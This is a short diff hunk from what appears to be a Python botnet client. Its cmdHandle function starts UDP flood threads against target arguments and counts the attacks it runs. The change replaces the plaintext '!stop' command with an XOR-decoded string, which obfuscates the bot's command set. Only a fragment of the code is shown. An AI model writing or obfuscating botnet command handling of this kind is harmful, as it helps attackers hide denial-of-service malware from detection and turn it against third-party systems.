@@ -147,7 +147,7 @@ def cmdHandle(sock):
 						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
-				elif command[0] == '!stop':
+				elif command[0] == xor_dec('QAAQCRc=',key):
 					stop = True
 					attack = 0#clear attack list
 			except:
